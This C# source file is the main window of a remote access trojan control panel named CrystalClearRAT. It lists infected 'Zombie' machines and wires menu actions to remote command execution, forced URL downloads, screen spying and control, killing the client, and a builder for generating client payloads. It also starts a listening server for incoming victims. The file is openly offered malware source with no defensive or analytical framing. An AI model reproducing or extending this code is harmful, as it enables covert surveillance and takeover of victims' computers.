using CrystalClearRAT.Event;
using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.Windows;
using CrystalClearRAT.ZombieModel;
using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Mono.Cecil;
using CrystalClearRAT.Properties;
using CrystalRATShared.Helper;
using System.IO;
using Newtonsoft.Json;
using CrystalClearRAT.Helper;
using MahApps.Metro.Controls;

namespace CrystalClearRAT
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : MetroWindow
    {

        bool listening;
        public MainWindow()
        {
            InitializeComponent();
            zombieListView.ItemsSource = Zombie.Zombies;
            SubscirbeEvents();
        }

        private void SubscirbeEvents()
        {
            FunctionManager.GenericCommandReceived += OnGenericCommandReceived;
        }

        private void OnGenericCommandReceived(object sender, EventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                string s = (e as GenericCommandArgs).Command + commandOutput.Text + Environment.NewLine;

                commandOutput.Text = s;
            });

        }

        private void ChatItem_Click(object sender, RoutedEventArgs e)
        {
            Zombie z = GetZombieFromMenuItem(sender);
            if (ChatWindow.ChatOpenedZombies.Contains(z))
            {
                MessageBox.Show("Cannot open two separate chatboxes for the same Zombie", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            else
            {
                new ChatWindow(z).Show();
            }
        }

        private void Grid_Loaded(object sender, RoutedEventArgs e)
        {


        }


        private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)

        {
            ListViewItem item = (ListViewItem)sender;

            ContextMenu menu = (ContextMenu)item.FindResource("zombieContextMenu");

            var zombie = ((ListViewItem)sender).Content as Zombie;

            menu.PlacementTarget = item;
            menu.IsOpen = true;

            //  Console.WriteLine(zombie.IP);
        }

        private void RemoteCMDItem_Click(object sender, RoutedEventArgs e)
        {
            new CommandWindow(GetZombieFromMenuItem(sender)).Show();
        }

        private void URLDownloadRequest_Click(object sender, RoutedEventArgs e)
        {
            new URLDownloadRequestWindow(GetZombieFromMenuItem(sender)).Show();
        }

        private static Zombie GetZombieFromMenuItem(object menuItem)
        {
            return (((menuItem as MenuItem).Parent as ContextMenu).PlacementTarget as ListViewItem).Content as Zombie;
        }

        private void SpyMonitorItem_Click(object sender, RoutedEventArgs e)
        {
            new ScreenControlWindow(GetZombieFromMenuItem(sender)).Show();
        }

        private void KillItem_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(Kill.Request(), GetZombieFromMenuItem(sender));
        }

        private void DialogItem_Click(object sender, RoutedEventArgs e)
        {
            new DialogBuilder(GetZombieFromMenuItem(sender)).Show();
        }
        private void BuildFileItem_Click(object sender, RoutedEventArgs e)
        {
            new BuilderWindow().Show();
        }

        private void TextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (this.IsInitialized)
            {
                if (string.IsNullOrWhiteSpace(portTextBox.Text))
                {
                    listeningButton.IsEnabled = false;
                }
                else
                {
                    listeningButton.IsEnabled = true;
                }
            }
        }

        private void listeningButton_Click(object sender, RoutedEventArgs e)
        {

            if (listening)
            {
                listeningButton.Content = "Start Listening";
                listening = false;
                Server.Kill();
            }
            else
            {

                int port;

                if (int.TryParse(portTextBox.Text, out port))
                {
                    listening = true;
                    listeningButton.Content = "Stop Listening";
                    Server.Start(port);
                }

                else
                {
                    MessageBox.Show("Port input is not valid", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }
    }
}
